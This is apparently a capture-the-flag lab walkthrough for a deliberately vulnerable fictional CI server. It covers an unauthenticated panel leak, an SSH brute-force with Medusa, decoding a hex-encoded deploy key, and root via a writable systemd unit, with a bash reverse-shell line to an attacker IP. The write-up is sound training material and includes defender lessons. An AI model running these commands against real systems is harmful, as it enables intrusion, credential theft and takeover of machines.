# Forge CI — Lab Walkthrough

**Theme:** Forge CI is a fictional startup's lightweight, self-hosted CI
runner for small dev teams. Their dashboard is mid-migration to SSO, and a
"temporary" unauthenticated debug panel — shipped so engineers could
eyeball build status without logging in — was never gated or removed. A
second, unrelated component (the runner agent) separately caches its own
deploy key on disk, hex-encoded "for tidiness," and that service account
was handed just enough scoped privilege to make its own writable service
file a full root path.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_forgeci.sh` target running on your own isolated lab VM only. Do
not run these techniques against systems you do not own or lack explicit
authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `cirunner`'s home directory immediately
  after logging in with the credential surfaced by the debug panel.
- `INTERMEDIATE_FLAG.txt` — found after locating and hex-decoding a
  cached deploy key and pivoting to `forgebot`.
- `HARD_FLAG.txt` — found after privilege escalation to root via a
  writable systemd unit combined with a narrowly scoped sudo grant.

**Flag Hints** (try these before reading the full walkthrough):

<details>
<summary>Hint: EASY_FLAG</summary>

There's a "temporary" status/debug page that was never gated behind a
login. See what it's willing to tell you without any credentials at
all.
</details>

<details>
<summary>Hint: INTERMEDIATE_FLAG</summary>

The CI runner agent caches something on disk "for tidiness" — encoded,
not encrypted. Find the cache file and figure out what encoding it's
using.
</details>

<details>
<summary>Hint: HARD_FLAG</summary>

Your pivoted account can write to a systemd unit file it doesn't own
the process for, and it also has a very narrow, specific sudo grant.
Think about what changing that unit file lets the *next* sudo'd action
actually run.
</details>

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated,
   host-only or NAT'd network (no bridged/public NIC).
2. Copy `setup_forgeci.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_forgeci.sh
   sudo ./setup_forgeci.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean
   restore point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity
   to the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

The homepage is just an "SSO migration in progress" placeholder, so
directory-bust the web root using the lab's `common.txt` wordlist:

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php
```

- `-w /usr/share/wordlists/dirb/common.txt` — a generic, widely-reused
  filename/directory list; `admin` is exactly the kind of generic path
  it's built to catch, which is why this box doesn't need a bigger or
  more specialized wordlist.
- `-x php` — also probe each hit for a `.php` extension.

This turns up:
```
/admin               (Status: 301)
```

Browse into it:

```bash
gobuster dir -u http://<target-ip>/admin/ -w /usr/share/wordlists/dirb/common.txt -x php
```

This surfaces `/admin/status.php` (`status` is another generic
`common.txt` entry). Fetch it:

```bash
curl http://<target-ip>/admin/status.php
```

---

## Part 2 – Identify Vulnerabilities

Two separate weaknesses need to be chained here before you reach root.

### 2a. Unauthenticated debug/admin panel leaking a fallback credential
     (initial access)

The panel loads with no login prompt at all — a page comment even admits
it: *"[TEMP] No auth wired up yet - ticket FORGE-77, remove before GA."*
Below that, a build-log excerpt names a specific fallback account:

```
[build #482] NOTE: CI box SSH access for on-call debugging is via the
             cirunner account (fallback while SSO migration is pending)
```

So you have a username (`cirunner`) but no password yet — that's the
next step, in Part 3.

### 2b. Hex-encoded deploy key in a world-readable state file
     (lateral movement, exploited in Part 4)

Not visible yet — this is discovered *after* you have a shell as
`cirunner`, in Part 4.

### 2c. Writable systemd unit + scoped sudo restart
     (privilege escalation, confirmed in Part 5)

Also not visible yet — discovered after landing on `forgebot`.

---

## Part 3 – Gain Access

You have a username but not a password. Rather than Hydra, use **Medusa**
for this one, for practice with a different brute-forcing tool against
the `rockyou.txt` wordlist. On Kali, `rockyou.txt` ships gzipped — unzip
it first if you haven't already:

```bash
sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
medusa -h <target-ip> -u cirunner -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f
```

- `-h <target-ip>` — target host.
- `-u cirunner` — the single username surfaced by the debug panel.
- `-P /usr/share/wordlists/rockyou.txt` — password wordlist to try, one
  per line.
- `-M ssh` — use Medusa's `ssh` module.
- `-t 4` — 4 parallel login threads (keep this low against a lab VM).
- `-f` — stop on first valid username/password pair found.

This recovers `cirunner:daniel1` in a short run (the password is
verified to sit at line 995 of the project's `rockyou.txt`, so this
completes quickly rather than requiring a full wordlist pass).

SSH in with the cracked credential:

```bash
ssh cirunner@<target-ip>
# password: daniel1
```

Grab the first flag straight away:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the debug-panel leak
plus a password crack, no further exploitation.

---

## Part 4 – Lateral Movement / Intermediate Challenge

As `cirunner`, look around for anything Forge-related outside your home
directory:

```bash
find / -iname "*forge*" -type d 2>/dev/null
```

```
/var/lib/forge
/var/lib/forge/artifacts
/var/lib/forge/state
```

Check what's readable in the state directory:

```bash
ls -la /var/lib/forge/state
cat /var/lib/forge/state/README.txt
```

```
Forge Agent local state cache
------------------------------
deploy_key.hex - cached agent deploy key (hex, not plaintext PEM, so this
                  is fine to leave world-readable for now - revisit once
                  the credential-store integration ships. ticket FORGE-104)
```

That comment is wrong — hex is an encoding, not protection. Read and
decode the cached key:

```bash
cat /var/lib/forge/state/deploy_key.hex
xxd -r -p /var/lib/forge/state/deploy_key.hex > forgebot_id_ed25519
chmod 600 forgebot_id_ed25519
```

- `xxd -r -p` — reverse mode (`-r`), plain hex-pairs input (`-p`): turns
  the hex text back into the original binary/text data, which here is an
  OpenSSH private key in PEM format.
- `chmod 600` — SSH refuses to use a private key file with overly
  permissive permissions.

Use the recovered key to pivot to the agent's service account:

```bash
ssh -i forgebot_id_ed25519 forgebot@<target-ip>
id
```

Grab the intermediate flag from its home directory:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

---

## Part 5 – Privilege Escalation

From your `forgebot` shell, check your group memberships:

```bash
id
```

```
uid=999(forgebot) gid=999(forgebot) groups=999(forgebot),1001(cirun-admins)
```

You're in `cirun-admins`. Check what that group can do with `sudo`:

```bash
sudo -l
```

```
User forgebot may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/systemctl restart forge-agent.service, /usr/bin/systemctl daemon-reload
```

At a glance this looks safe — it only restarts one named service, no
shell command. But check who can *edit* that service's unit file:

```bash
ls -l /etc/systemd/system/forge-agent.service
```

```
-rw-rw-r-- 1 root cirun-admins 219 ... /etc/systemd/system/forge-agent.service
```

`cirun-admins` has group-write access to the unit file for the exact
service you're allowed to restart as root. Controlling `ExecStart` on a
unit you can also restart with root privileges is a full root primitive
— the scoped sudo rule doesn't help once the thing it restarts is
attacker-controlled. Edit it:

```bash
cat > /etc/systemd/system/forge-agent.service <<'UNIT'
[Unit]
Description=Forge CI runner agent

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /root/HARD_FLAG.txt /tmp/root_flag_out.txt; chmod 644 /tmp/root_flag_out.txt'

[Install]
WantedBy=multi-user.target
UNIT
```

- `Type=oneshot` — run the command once and exit, rather than expecting
  a long-running process (simpler than the original `Type=simple`
  service for this purpose).
- `ExecStart=...` — this now runs as root the moment the unit starts,
  regardless of what it used to do.

Reload the unit definition and restart it, both permitted by your scoped
sudo rule:

```bash
sudo /usr/bin/systemctl daemon-reload
sudo /usr/bin/systemctl restart forge-agent.service
cat /tmp/root_flag_out.txt
```

**🚩 HARD_FLAG captured.**

If you'd rather land an interactive root shell instead of just reading
the flag file, point `ExecStart` at a reverse shell and catch a listener
on your attacker box first:

```bash
# on your attacker box, before restarting the unit:
nc -lvnp 4444
```

```bash
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
```

Then repeat the `daemon-reload` + `restart` steps above. Once the shell
connects, confirm you're root:

```bash
id
```

You should see `uid=0(root)`.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - cirunner's home dir, reached via the debug-panel leak + Medusa crack (Part 3)
cat /home/cirunner/EASY_FLAG.txt

# Intermediate - forgebot's home dir, reached via the hex-decoded deploy key (Part 4)
cat /home/forgebot/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via the writable unit + scoped sudo restart (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — an unauthenticated debug panel:** a "temporary"
   status page shipped without any authentication and was never removed
   before launch. It leaked a build-log comment naming a specific
   fallback SSH account (`cirunner`), and a short Medusa run against
   `rockyou.txt` recovered its weak password.
2. **Lateral movement — a deploy key hex-encoded in a world-readable
   state file:** the CI agent cached its own SSH deploy key locally,
   hex-encoded on the mistaken assumption that this made it safe to
   leave world-readable. Hex, like Base64 or Base32, is an encoding, not
   encryption — anyone who can read the file can reconstruct the key.
3. **Privilege escalation — a writable systemd unit paired with a
   narrowly scoped sudo grant:** `forgebot` belonged to a group with
   write access to the very unit file it was also permitted, via sudo,
   to restart as root. The sudo rule looked safe in isolation (no
   generic shell access, just one named service) but controlling
   `ExecStart` on a unit you can also restart as root is equivalent to
   arbitrary root code execution — a distinct primitive from
   sudo/GTFOBins pivots, SUID/PATH-hijack binaries, group-writable cron
   scripts, or misassigned capabilities.

**Root cause lessons for defenders:**
- Never ship a "temporary" unauthenticated panel to a reachable network
  — gate it behind auth from the first commit, or don't deploy it at
  all.
- Any encoding (hex, Base64, Base32) is not a substitute for a secrets
  manager or encryption at rest; treat encoded credential material as
  equivalent to plaintext when setting file permissions.
- When scoping a sudo rule to a specific service, also audit who can
  write to that service's unit file and any binaries/scripts it
  executes. A "safe," narrowly-scoped sudo grant is only as safe as the
  integrity of everything it touches.
- Prefer read-only, root-owned unit files (`chmod 644`, `root:root`)
  even when a non-root group needs to trigger restarts; use a wrapper
  script with fixed, audited behavior instead of granting write access
  to the unit itself.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk
   entirely rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `daniel1` anywhere real).
